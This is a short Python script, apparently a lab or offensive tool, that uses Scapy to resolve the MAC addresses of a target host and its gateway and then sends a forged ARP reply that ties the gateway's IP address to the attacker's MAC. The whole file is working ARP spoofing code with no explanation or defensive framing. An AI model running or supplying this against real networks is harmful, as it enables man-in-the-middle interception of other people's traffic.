from scapy.all import *

target_ip = "10.2.0.195"
gateway_ip = "10.2.0.1"
iface = "eth0"

target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)
attacker_mac = get_if_hwaddr(iface)

if target_mac and gateway_mac:
    print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}, Attacker MAC: {attacker_mac}")
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    send(packet, iface=iface, verbose=True)
else:
    print("Failed to get MAC addresses.")
